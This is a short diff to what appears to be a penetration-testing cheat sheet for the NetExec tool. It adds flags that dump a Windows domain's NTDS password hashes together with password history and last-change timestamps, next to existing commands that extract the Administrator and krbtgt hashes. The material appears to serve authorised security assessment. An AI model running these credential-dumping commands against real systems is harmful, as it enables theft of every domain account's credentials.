@@ -149,6 +149,15 @@ nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
 nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
 ```
 
+Optional flags for password analysis:
+- `--ntds-history` — dumps password history for each account (useful for spotting reuse patterns and reporting)
+- `--ntds-pwdLastSet` — includes last password change timestamp alongside each hash (useful for staleness analysis)
+
+```bash
+# Full dump with history and timestamps
+nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --ntds-history --ntds-pwdLastSet
+```
+
 ## LDAP Operations
 
 ### Admin Count Enumeration
